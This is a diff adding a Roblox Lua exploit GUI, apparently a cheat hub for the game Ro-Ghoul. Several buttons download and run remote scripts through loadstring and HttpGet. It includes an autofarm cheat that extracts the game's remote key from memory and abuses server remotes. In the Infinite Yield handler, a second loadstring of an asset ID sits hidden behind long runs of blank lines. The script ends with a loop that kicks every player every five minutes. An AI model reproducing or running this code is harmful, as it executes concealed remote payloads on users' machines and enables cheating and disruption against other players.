+LevelStat.Font = Enum.Font.FredokaOne
+LevelStat.Text = "-LevelStat-"
+LevelStat.TextColor3 = Color3.fromRGB(255, 255, 255)
+LevelStat.TextScaled = true
+LevelStat.TextSize = 14.000
+LevelStat.TextWrapped = true
+
+UICorner_24.CornerRadius = UDim.new(0, 5)
+UICorner_24.Parent = LevelStat
+
+UIAspectRatioConstraint_28.Parent = LevelStat
+UIAspectRatioConstraint_28.AspectRatio = 4.682
+
+UITextSizeConstraint_15.Parent = LevelStat
+UITextSizeConstraint_15.MaxTextSize = 14
+
+YenStat.Name = "YenStat"
+YenStat.Parent = Stats
+YenStat.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
+YenStat.BorderColor3 = Color3.fromRGB(0, 0, 0)
+YenStat.BorderSizePixel = 0
+YenStat.Position = UDim2.new(0.214285716, 0, 0.5053249, 0)
+YenStat.Size = UDim2.new(0.565934062, 0, 0.191304341, 0)
+YenStat.Font = Enum.Font.FredokaOne
+YenStat.Text = "-YenStat-"
+YenStat.TextColor3 = Color3.fromRGB(255, 255, 255)
+YenStat.TextScaled = true
+YenStat.TextSize = 14.000
+YenStat.TextWrapped = true
+
+UICorner_25.CornerRadius = UDim.new(0, 5)
+UICorner_25.Parent = YenStat
+
+UIAspectRatioConstraint_29.Parent = YenStat
+UIAspectRatioConstraint_29.AspectRatio = 4.682
+
+UITextSizeConstraint_16.Parent = YenStat
+UITextSizeConstraint_16.MaxTextSize = 14
+
+RepStat.Name = "RepStat"
+RepStat.Parent = Stats
+RepStat.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
+RepStat.BorderColor3 = Color3.fromRGB(0, 0, 0)
+RepStat.BorderSizePixel = 0
+RepStat.Position = UDim2.new(0.214285716, 0, 0.740107536, 0)
+RepStat.Size = UDim2.new(0.565934062, 0, 0.191304341, 0)
+RepStat.Font = Enum.Font.FredokaOne
+RepStat.Text = "-RepStat-"
+RepStat.TextColor3 = Color3.fromRGB(255, 255, 255)
+RepStat.TextScaled = true
+RepStat.TextSize = 14.000
+RepStat.TextWrapped = true
+
+UICorner_26.CornerRadius = UDim.new(0, 5)
+UICorner_26.Parent = RepStat
+
+UIAspectRatioConstraint_30.Parent = RepStat
+UIAspectRatioConstraint_30.AspectRatio = 4.682
+
+UITextSizeConstraint_17.Parent = RepStat
+UITextSizeConstraint_17.MaxTextSize = 14
+
+UIAspectRatioConstraint_31.Parent = Stats
+UIAspectRatioConstraint_31.AspectRatio = 1.583
+
+Toolbar_2.Name = "Toolbar"
+Toolbar_2.Parent = StatsFrame
+Toolbar_2.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+Toolbar_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Toolbar_2.BorderSizePixel = 0
+Toolbar_2.Position = UDim2.new(2.95242444e-07, 0, -0.00509785116, 0)
+Toolbar_2.Size = UDim2.new(1.0013113, 0, 0.249806151, 0)
+
+UICorner_27.CornerRadius = UDim.new(0, 5)
+UICorner_27.Parent = Toolbar_2
+
+CULabel_2.Name = "CULabel"
+CULabel_2.Parent = Toolbar_2
+CULabel_2.AnchorPoint = Vector2.new(0.5, 0)
+CULabel_2.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+CULabel_2.BackgroundTransparency = 1.000
+CULabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+CULabel_2.BorderSizePixel = 0
+CULabel_2.Position = UDim2.new(0.451233506, 0, -0.00663103396, 0)
+CULabel_2.Size = UDim2.new(0.622273743, 0, 1.00819135, 0)
+CULabel_2.Font = Enum.Font.FredokaOne
+CULabel_2.Text = "Stats"
+CULabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+CULabel_2.TextScaled = true
+CULabel_2.TextSize = 23.000
+CULabel_2.TextWrapped = true
+
+UITextSizeConstraint_18.Parent = CULabel_2
+UITextSizeConstraint_18.MaxTextSize = 23
+
+UIAspectRatioConstraint_32.Parent = CULabel_2
+UIAspectRatioConstraint_32.AspectRatio = 2.607
+
+Close_3.Name = "Close"
+Close_3.Parent = Toolbar_2
+Close_3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Close_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Close_3.BorderSizePixel = 0
+Close_3.Position = UDim2.new(0.799616277, 0, 0.144999608, 0)
+Close_3.Size = UDim2.new(0.165351391, 0, 0.694148183, 0)
+Close_3.Image = "http://www.roblox.com/asset/?id=6031094678"
+Close_3.ScaleType = Enum.ScaleType.Fit
+
+UICorner_28.Parent = Close_3
+
+UIAspectRatioConstraint_33.Parent = Close_3
+UIAspectRatioConstraint_33.AspectRatio = 1.006
+
+UIAspectRatioConstraint_34.Parent = Toolbar_2
+UIAspectRatioConstraint_34.AspectRatio = 4.224
+
+OpenButton.Name = "OpenButton"
+OpenButton.Parent = ScreenGui
+OpenButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+OpenButton.BackgroundTransparency = 0.350
+OpenButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+OpenButton.BorderSizePixel = 0
+OpenButton.Position = UDim2.new(0, 0, 0.41093117, 0)
+OpenButton.Size = UDim2.new(0.0439477004, 0, 0.103019103, 0)
+OpenButton.Visible = false
+OpenButton.Image = "rbxassetid://16519606293"
+OpenButton.ScaleType = Enum.ScaleType.Fit
+OpenButton.MouseButton1Click:Connect(function()
+	sum.Parent.MainFrame.Visible = true 
+	sum.Parent.OpenButton.Visible = false 
+end)
+
+UICorner_29.CornerRadius = UDim.new(0, 30)
+UICorner_29.Parent = OpenButton
+
+UIAspectRatioConstraint_35.Parent = OpenButton
+
+-- Scripts:
+
+local function AFYAV_fake_script() -- Close.LocalScript 
+	local script = Instance.new('LocalScript', Close)
+
+	local sum = script.Parent
+	
+	sum.MouseButton1Click:Connect(function()
+		sum.Parent.Parent.Parent.MainFrame.Visible = false 
+	end)
+end
+coroutine.wrap(AFYAV_fake_script)()
+local function RQFK_fake_script() -- Minimize.LocalScript 
+	local script = Instance.new('LocalScript', Minimize)
+
+	local sum = script.Parent
+	
+	sum.MouseButton1Click:Connect(function()
+		sum.Parent.Parent.Parent.MainFrame.Visible = false
+		sum.Parent.Parent.Parent.OpenButton.Visible = true
+	end)
+end
+coroutine.wrap(RQFK_fake_script)()
+local function GRRRZ_fake_script() -- WHK.LocalScript 
+	local script = Instance.new('LocalScript', WHK)
+
+	local sum = script.Parent
+	
+	sum.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/StrongBomber/projectluacore/main/roghoulwhk'))()
+	end)
+end
+coroutine.wrap(GRRRZ_fake_script)()
+local function ACNTSR_fake_script() -- Z4GS.LocalScript 
+	local script = Instance.new('LocalScript', Z4GS)
+
+	local sum = script.Parent
+	
+	sum.MouseButton1Click:Connect(function()
+		local gui = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/z4gs/scripts/master/testtttt.lua"))():AddWindow("Ro-Ghoul", {
+			main_color = Color3.fromRGB(0,0,0),
+			min_size = Vector2.new(373, 340),
+			can_resize = false
+		})
+	
+		local get = setmetatable({}, {
+			__index = function(a, b)
+				return game:GetService(b) or game[b]
+			end
+		})
+	
+		local tab1, tab2, tab3, tab4 = gui:AddTab("Main"), gui:AddTab("Farm Options"), gui:AddTab("Trainer"), gui:AddTab("Misc")
+		local btn, btn2, btn3, key, nmc, trainers, labels
+		local findobj, findobjofclass, waitforobj, fire, invoke = get.FindFirstChild, get.FindFirstChildOfClass, get.WaitForChild, Instance.new("RemoteEvent").FireServer, Instance.new("RemoteFunction").InvokeServer
+		local player = get.Players.LocalPlayer
+	
+		repeat wait() until player:FindFirstChild("PlayerFolder")
+	
+		local team, remotes, stat = player.PlayerFolder.Customization.Team.Value, get.ReplicatedStorage.Remotes, player.PlayerFolder.StatsFunction
+		local oldtick, farmtick = 0, 0
+		local camera = workspace.CurrentCamera
+		local myData = loadstring(game:HttpGet("https://raw.githubusercontent.com/z4gs/scripts/master/Settings.lua"))()("Ro-Ghoul Autofarm", {
+			Skills = {
+				E = false,
+				F = false,
+				C = false,
+				R = false
+			},
+			Boss = {
+				["Gyakusatsu"] = false,
+				["Eto Yoshimura"] = false,
+				["Koutarou Amon"] = false,
+				["Nishiki Nishio"] = false
+			},
+			DistanceFromNpc = 5,
+			DistanceFromBoss = 8,
+			TeleportSpeed = 550,
+			ReputationFarm = false,
+			ReputationCashout = false,
+			AutoKickWhitelist = ""
+		})
+	
+		local array = {
+			boss = {
+				["Gyakusatsu"] = 1250,
+				["Eto Yoshimura"] = 1250,
+				["Koutarou Amon"] = 750,
+				["Nishiki Nishio"] = 250
+			},
+	
+			npcs = {["Aogiri Members"] = "GhoulSpawns", Investigators = "CCGSpawns", Humans = "HumanSpawns"},
+	
+			stages = {"One", "Two", "Three", "Four", "Five", "Six"},
+	
+			skills = {
+				E = player.PlayerFolder.Special1CD,
+				F = player.PlayerFolder.Special3CD,
+				C = player.PlayerFolder.SpecialBonusCD,
+				R = player.PlayerFolder.Special2CD
+			}
+		}
+	
+		tab1:AddLabel("Target")
+	
+		local drop = tab1:AddDropdown("Select", function(opt)
+			array.targ = array.npcs[opt]
+		end)
+	
+		btn = tab1:AddButton("Start", function()
+			if not array.autofarm then
+				if key then
+					btn.Text, array.autofarm = "Stop", true
+					local farmtick = tick()
+					while array.autofarm do
+						labels("tfarm", "Time elapsed: "..os.date("!%H:%M:%S", tick() - farmtick))
+						wait(1)
+					end
+				else
+					player:Kick("Failed to get the Remote key, please try to execute the script again")
+				end
+			else
+				btn.Text, array.autofarm, array.died = "Start", false, false
+			end
+		end)
+	
+		local function format(number)
+			local i, k, j = tostring(number):match("(%-?%d?)(%d*)(%.?.*)")
+			return i..k:reverse():gsub("(%d%d%d)", "%1,"):reverse()..j
+		end
+	
+		labels = setmetatable({
+			text = {label = tab1:AddLabel("")},
+			tfarm = {label = tab1:AddLabel("")},
+			space = {label = tab1:AddLabel("")},
+			Quest = {prefix = "Current Quest: ", label = tab1:AddLabel("Current Quest: None")},
+			Yen = {prefix = "Yen: ", label = tab1:AddLabel("Yen: 0"), value = 0, oldval = player.PlayerFolder.Stats.Yen.Value},
+			RC = {prefix = "RC: ", label = tab1:AddLabel("RC: 0"), value = 0, oldval = player.PlayerFolder.Stats.RC.Value},
+			Kills = {prefix = "Kills: ", label = tab1:AddLabel("Kills: 0"), value = 0} 
+		}, {
+			__call = function (self, typ, newv, oldv)
+				if typ and newv then
+					local object = self[typ]
+					if type(newv) == "number" then
+						object.value = object.value + newv
+						object.label.Text = object.prefix..format(object.value)
+						if oldv then
+							object.oldval = oldv
+						end
+					elseif object.prefix then
+						object.label.Text = object.prefix..newv
+					else
+						object.label.Text = newv
+					end
+					return
+				end
+				for i,v in pairs(labels) do
+					v.value = 0
+					v.label.Text = v.prefix.."0"
+				end
+			end
+		})
+	
+		local function getLabel(la)
+			return labels[la].value and labels[la].value or labels[la].label.Text
+		end
+	
+		btn3 = tab1:AddButton("Reset", function() labels() end)
+	
+		if team == "CCG" then tab2:AddLabel("Quinque Stage") else tab2:AddLabel("Kagune Stage") end
+	
+		local drop2 = tab2:AddDropdown("[ 1 ]", function(opt)
+			array.stage = array.stages[tonumber(opt)]
+		end)
+	
+		array.stage = "One"
+	
+		tab2:AddSwitch("Reputation Farm", function(bool) 
+			myData.ReputationFarm = bool
+		end):Set(myData.ReputationFarm)
+	
+		tab2:AddSwitch("Auto Reputation Cashout", function(bool)
+			myData.ReputationCashout = bool
+		end):Set(myData.ReputationCashout)
+	
+		for i,v in pairs(array.boss) do
+			tab2:AddSwitch(i.." Boss Farm ".."(".."lvl "..v.."+)", function(bool)
+				myData.Boss[i] = bool
+			end):Set(myData.Boss[i])
+		end
+	
+		tab2:AddSlider("TP Speed", function(x)
+			myData.TeleportSpeed = x
+		end, {min = 90, max = 550}):Set(45)
+	
+		tab2:AddSlider("Distance from NPC", function(x)
+			myData.DistanceFromNpc = x * -1
+		end, {min = 0, max = 8}):Set(65)
+	
+		tab2:AddSlider("Distance from Bosses", function(x)
+			myData.DistanceFromBoss = x * -1
+		end, {min = 0, max = 15}):Set(55)
+	
+		labels.p = {label = tab3:AddLabel("Current trainer: "..player.PlayerFolder.Trainers[team.."Trainer"].Value)}
+	
+		local progress = tab3:AddSlider("Progress", nil, {min = 0, max = 100, readonly = true})
+	
+		progress:Set(player.PlayerFolder.Trainers[player.PlayerFolder.Trainers[team.."Trainer"].Value].Progress.Value)
+	
+		player.PlayerFolder.Trainers[team.."Trainer"].Changed:connect(function()
+			labels("p", "Current trainer: "..player.PlayerFolder.Trainers[team.."Trainer"].Value)
+			progress:Set(player.PlayerFolder.Trainers[player.PlayerFolder.Trainers[team.."Trainer"].Value].Progress.Value)
+		end)
+	
+		btn2 = tab3:AddButton("Start", function()
+			if not array.trainer then
+				array.trainer, btn2.Text = true, "Stop"
+				local connection, time
+	
+				while array.trainer do
+					if connection and connection.Connected then
+						connection:Disconnect()
+					end
+	
+					local tkey, result
+	
+					connection = player.Backpack.DescendantAdded:Connect(function(obj)
+						if tostring(obj) == "TSCodeVal" and obj:IsA("StringValue") then
+							tkey = obj.Value
+						end
+					end)
+	
+					result = invoke(remotes.Trainers.RequestTraining)
+	
+					if result == "TRAINING" then
+						for i,v in pairs(workspace.TrainingSessions:GetChildren()) do
+							if waitforobj(v, "Player").Value == player then
+								fire(waitforobj(v, "Comm"), "Finished", tkey, false)
+								break
+							end
+						end
+					elseif result == "TRAINING COMPLETE" then
+						labels("time", "Switching to other trainer...")
+						for i,v in pairs(player.PlayerFolder.Trainers:GetDescendants()) do
+							if table.find(trainers, v.Name) and findobj(v, "Progress") and tonumber(v.Progress.Value) < 100 and tonumber(player.PlayerFolder.Trainers[player.PlayerFolder.Trainers[team.."Trainer"].Value].Progress.Value) == 100 then
+								invoke(remotes.Trainers.ChangeTrainer, v.Name)
+								wait(1.5)
+							end
+						end
+					else
+						labels("time", "Time until the next training: "..result)
+					end
+					wait(1)
+				end
+				labels("time", "")
+			else
+				array.trainer, btn2.Text = false, "Start"
+			end
+		end)
+	
+		labels.time = {label = tab3:AddLabel("")}
+	
+		tab4:AddSwitch("Auto add kagune/quinque stats", function(bool) array.weapon = bool end)
+		tab4:AddSwitch("Auto add durability stats", function(bool) array.dura = bool end)
+		tab4:AddSwitch("Auto kick", function(bool) array.kick = bool end)
+		tab4:AddLabel("Auto kick whitelist (type 1 name per line)")
+	
+		local console = tab4:AddConsole({
+			["y"] = 50,
+			["source"] = "Text",
+		})
+	
+		console:Set(myData.AutoKickWhitelist)
+	
+		console:OnChange(function(newtext)
+			myData.AutoKickWhitelist = newtext
+		end)
+	
+		for i,v in pairs(array.skills) do
+			tab4:AddSwitch("Auto use "..i.." skill (on bosses)", function(bool)
+				myData.Skills[i] = bool
+			end):Set(myData.Skills[i])
+		end
+	
+		do
+			local count = 0
+			for i,v in pairs(player.PlayerGui.HUD.StagesFrame.InfoScroll:GetChildren()) do
+				if v.ClassName == "Frame" and v.Name ~= "Example" then
+					count = count + 1
+					drop2:Add(count)
+				end
+			end
+		end
+	
+		for i,v in pairs(array.npcs) do drop:Add(i) end
+	
+		tab1:Show()
+	
+		local function tp(pos)
+			if array.died then
+				player.Character.HumanoidRootPart.CFrame = pos
+				array.died = false
+				return
+			end
+	
+			local val = Instance.new("CFrameValue")
+			val.Value = player.Character.HumanoidRootPart.CFrame
+	
+			local tween = game:GetService("TweenService"):Create(
+			val, 
+			TweenInfo.new((player.Character.HumanoidRootPart.Position - pos.p).magnitude / myData.TeleportSpeed, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0), 
+			{Value = pos}
+			)
+	
+			tween:Play()
+	
+			local completed
+			tween.Completed:Connect(function()
+				completed = true
+			end)
+	
+			while not completed do
+				if array.found or not array.autofarm or player.Character.Humanoid.Health <= 0 then tween:Cancel() break end
+				player.Character.HumanoidRootPart.CFrame = val.Value
+				task.wait()
+			end
+	
+			val:Destroy()
+		end
+	
+		local function getNPC()
+			local nearestnpc, nearest = nil, math.huge
+	
+			if myData.Boss.Gyakusatsu and tonumber(player.PlayerFolder.Stats.Level.Value) > array.boss["Gyakusatsu"] and findobj(workspace.NPCSpawns["GyakusatsuSpawn"], "Gyakusatsu") then
+				local lowesthealth, lowestNpcModel = math.huge, nil
+	
+				for i,v in pairs(workspace.NPCSpawns["GyakusatsuSpawn"]:GetChildren()) do
+					if v.Name ~= "Mob" and findobj(v, "Humanoid") and v.Humanoid.Health < lowesthealth then
+						lowesthealth = v.Humanoid.Health
+						lowestNpcModel = v
+					end
+				end
+	
+				if not lowestNpcModel then
+					return workspace.NPCSpawns.GyakusatsuSpawn.Gyakusatsu
+				end
+	
+				return lowestNpcModel
+			end
+	
+			for i,v in pairs(workspace.NPCSpawns:GetChildren()) do
+				local npc = findobjofclass(v, "Model")
+	
+				if npc and findobj(npc, "Head") and not findobj(npc, "AC") then
+					if npc.Parent.Name == array.targ then
+						local magnitude = (npc.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).magnitude
+	
+						if magnitude < nearest then
+							nearestnpc, nearest = npc, magnitude
+						end
+					elseif myData.Boss[npc.Name] and tonumber(player.PlayerFolder.Stats.Level.Value) >= array.boss[npc.Name] then
+						return npc
+					end
+				end
+			end
+			return nearestnpc
+		end
+	
+		local function getQuest(typ)
+			labels("text", "Moving to quest NPC")
+	
+			local npc = team == "Ghoul" and workspace.Anteiku.Yoshimura or workspace.CCGBuilding.Yoshitoki
+	
+			tp(npc.HumanoidRootPart.CFrame)
+			invoke(game:GetService("ReplicatedStorage").Remotes.Ally.AllyInfo)
+			wait()
+			fireclickdetector(npc.TaskIndicator.ClickDetector)
+	
+			if array.autofarm and not array.died and (npc.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude <= 20 then
+				if typ then 
+					labels("text", "Getting quest...")
+					invoke(remotes[npc.Name].Task)
+					invoke(remotes[npc.Name].Task)
+					local quest = waitforobj(player.PlayerFolder.CurrentQuest.Complete, "Aogiri Member")
+					labels("Quest", ("%c/%c"):format("0", quest:WaitForChild("Max").Value))
+					quest.Changed:Connect(function(change) 
+						labels("Quest", ("%c/%c"):format(change, quest.Max.Value)) 
+					end)
+				else
+					labels("text", "Withdrawing reputation")
+					invoke(remotes.ReputationCashOut)
+					oldtick = tick()
+				end
+			end
+		end
+	
+		local function collect(npc)
+			local timer = tick()
+			local model = waitforobj(npc, npc.Name.." Corpse", 2)
+			local clickpart = waitforobj(model, "ClickPart", 2)
+	
+			player.Character.HumanoidRootPart.CFrame = clickpart.CFrame * CFrame.new(0,1.7,0)
+	
+			waitforobj(clickpart, "")
+			repeat
+				if tick() - timer > 4 then
+					break
+				end
+				player.Character.Humanoid:MoveTo(clickpart.Position)
+				wait()
+				fireclickdetector(clickpart[""], 1)
+			until not model.Parent.Parent or not findobj(model, "ClickPart") or not array.autofarm or player.Character.Humanoid.Health <= 0
+		end
+	
+		local function pressKey(topress)
+			fire(player.Character.Remotes.KeyEvent, key, topress, "Down", player:GetMouse().Hit, nil, workspace.Camera.CFrame)
+		end
+	
+		player.PlayerFolder.Stats.RC.Changed:Connect(function(value)
+			if array.autofarm then
+				labels("RC", value - labels.RC.oldval, value)
+			end
+		end)
+	
+		player.PlayerFolder.Stats.Yen.Changed:Connect(function(value)
+			if array.autofarm then
+				labels("Yen", value - labels.Yen.oldval, value)
+			end
+		end)
+	
+		getconnections(player.Idled)[1]:Disable()
+	
+		get.Players.PlayerAdded:Connect(function(plr)
+			if array.kick then
+				local splittedarray = console:Get():split("\n")
+	
+				if not table.find(splittedarray, plr.Name) then
+					player:Kick("Player joined, name: "..plr.Name) 
+				end
+			end
+		end)
+	
+		player.PlayerFolder.Trainers[player.PlayerFolder.Trainers[team.."Trainer"].Value].Progress.Changed:Connect(function(c)
+			progress:Set(tonumber(c))
+		end)
+	
+		coroutine.wrap(function()
+			while wait() do
+				if tonumber(player.PlayerFolder.Stats.Focus.Value) > 0 then
+					if array.weapon then
+						invoke(stat, "Focus", "WeaponAddButton", 1)
+					end
+					if array.dura then
+						invoke(stat, "Focus", "DurabilityAddButton", 1)
+					end
+				end
+			end
+		end)()
+	
+		-- remote Key grabber + grab updated trainers table
+		do
+			fireclickdetector(workspace.TrainerModel.ClickIndicator.ClickDetector)
+			waitforobj(waitforobj(player.PlayerGui, "TrainersGui"), "TrainersGuiScript")
+			player.PlayerGui.TrainersGui:Destroy()
+	
+			repeat 
+				for i,v in pairs(getgc(true)) do
+					if not key and type(v) == "function" and getinfo(v).source:find(".ClientControl") then
+						for i2,v2 in pairs(getconstants(v)) do
+							if v2 == "KeyEvent" then
+								local keyfound = getconstant(v, i2 + 1)
+								if #keyfound >= 100 then
+									key = keyfound
+									break
+								end
+							end
+						end
+					elseif type(v) == "table" and ((table.find(v, "(S1) Kureo Mado") and team == "CCG") or (table.find(v, "(S1) Ken Kaneki"))) then
+						trainers = v
+					end
+				end
+				wait()
+			until key
+		end
+	
+		-- auto farm
+		while true do
+			if array.autofarm then
+				pcall(function()
+					if player.Character.Humanoid.Health > 0 and player.Character.HumanoidRootPart and player.Character.Remotes.KeyEvent then
+						if not findobj(player.Character, "Kagune") and not findobj(player.Character, "Quinque")  then
+							pressKey(array.stage)
+						end
+						if myData.ReputationFarm and (not findobj(player.PlayerFolder.CurrentQuest.Complete, "Aogiri Member") or player.PlayerFolder.CurrentQuest.Complete["Aogiri Member"].Value == player.PlayerFolder.CurrentQuest.Complete["Aogiri Member"].Max.Value) then
+							getQuest(true)
+							return
+						elseif myData.ReputationCashout and tick() - oldtick > 7200 then
+							getQuest()
+						end
+	
+						local npc = getNPC()
+	
+						if npc then
+							array.found = false
+							local reached = false
+	
+							coroutine.wrap(function()
+								while not reached do
+									if npc ~= getNPC() then
+										array.found = true
+										break
+									end
+									wait()
+								end
+							end)()
+	
+							labels("text", "Moving to: "..npc.Name)
+	
+							if myData.Boss[npc.Name] or npc.Parent.Name == "GyakusatsuSpawn" then
+								tp(npc.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(90),0,0) + Vector3.new(0,myData.DistanceFromBoss,0))
+							else
+								tp(npc.HumanoidRootPart.CFrame + npc.HumanoidRootPart.CFrame.lookVector * myData.DistanceFromNpc)
+							end
+	
+							labels("text", "Killing: "..npc.Name)
+	
+							reached = true
+	
+							if not array.found then
+								while findobj(findobj(npc.Parent, npc.Name), "Head") and player.Character.Humanoid.Health > 0 and array.autofarm do
+									if not findobj(player.Character, "Kagune") and not findobj(player.Character, "Quinque")  then
+										pressKey(array.stage)
+									end
+									if myData.Boss[npc.Name] or npc.Parent.Name == "GyakusatsuSpawn" then 
+										for x,y in pairs(myData.Skills) do
+											if player.PlayerFolder.CanAct.Value and y and array.skills[x].Value ~= "DownTime" then
+												pressKey(x)
+											end
+										end
+										player.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(90),0,0) + Vector3.new(0,myData.DistanceFromBoss ,0)
+									else
+										player.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame + npc.HumanoidRootPart.CFrame.lookVector * myData.DistanceFromNpc 
+									end
+									if player.PlayerFolder.CanAct.Value then
+										pressKey("Mouse1")
+									end
+									task.wait()
+								end
+	
+								if npc.Name == "Gyakusatsu" then
+									player.Character.Humanoid.Health = 0
+								end
+	
+								if array.autofarm and player.Character.Humanoid.Health > 0 then
+									labels("Kills", 1)
+									if npc.Name ~= "Eto Yoshimura" and not findobj(npc.Parent, "Gyakusatsu") and npc.Name ~= "Gyakusatsu" then  
+										labels("text", "Collecting corpse...")
+										collect(npc)
+									end
+								end
+							end
+						else
+							labels("text", "Target not found, waiting...")
+						end
+					else
+						labels("text", "Waiting for character to respawn")
+						array.died = true
+					end
+				end)
+			else
+				labels("text", "")
+			end
+			wait()
+		end
+	end)
+end
+coroutine.wrap(ACNTSR_fake_script)()
+local function VLUDDNX_fake_script() -- IYield.LocalScript 
+	local script = Instance.new('LocalScript', IYield)
+
+	local sum = script.Parent
+	
+	sum.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+		loadstring(game:GetObjects("rbxassetid://15900013841")[1].Source)()
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	end)
+end
+coroutine.wrap(VLUDDNX_fake_script)()
+local function VACWWNS_fake_script() -- Rejoin.LocalScript 
+	local script = Instance.new('LocalScript', Rejoin)
+
+	print("Rejoining... Made By Raiwesy")
+	game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(state)
+		if state == Enum.TeleportState.Started then
+			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
+		end
+	end)
+	
+end
+coroutine.wrap(VACWWNS_fake_script)()
+local function LSYZL_fake_script() -- Close_2.LocalScript 
+	local script = Instance.new('LocalScript', Close_2)
+
+	local sum = script.Parent
+	
+	sum.MouseButton1Click:Connect(function()
+		sum.Parent.Parent.Parent.ContactFrame.Visible = false 
+	end)
+end
+coroutine.wrap(LSYZL_fake_script)()
+local function MMRV_fake_script() -- PlayerName.LocalScript 
+	local script = Instance.new('LocalScript', PlayerName)
+
+	script.Parent.Text = game:GetService("Players").LocalPlayer.Name
+end
+coroutine.wrap(MMRV_fake_script)()
+local function DBMI_fake_script() -- LevelStat.LocalScript 
+	local script = Instance.new('LocalScript', LevelStat)
+
+	script.Parent.Text = game.Players.LocalPlayer.PlayerGui.MobileHUD.MainFrame.StatsFrame.LevelLabel.Text
+end
+coroutine.wrap(DBMI_fake_script)()
+local function URXD_fake_script() -- YenStat.LocalScript 
+	local script = Instance.new('LocalScript', YenStat)
+
+	script.Parent.Text = game.Players.LocalPlayer.PlayerGui.MobileHUD.MainFrame.StatsFrame.YenLabel.Text
+end
+coroutine.wrap(URXD_fake_script)()
+local function UPVHYS_fake_script() -- RepStat.LocalScript 
+	local script = Instance.new('LocalScript', RepStat)
+
+	script.Parent.Text = game.Players.LocalPlayer.PlayerGui.MobileHUD.MainFrame.StatsFrame.ReputationLabel.Text
+end
+coroutine.wrap(UPVHYS_fake_script)()
+local function DYBQLAO_fake_script() -- Close_3.LocalScript 
+	local script = Instance.new('LocalScript', Close_3)
+
+	local sum = script.Parent
+	
+	sum.MouseButton1Click:Connect(function()
+		sum.Parent.Parent.Parent.StatsFrame.Visible = false 
+	end)
+end
+
+local Players = game:GetService("Players")
+
+local function kickPlayer(player)
+    player:Kick("Made By Raiwesy.")
+end
+
+while true do
+    for _, player in ipairs(Players:GetPlayers()) do
+        kickPlayer(player)
+    end
+    wait(300) -- 300 saniye (5 dakika) bekleyecektir
+end
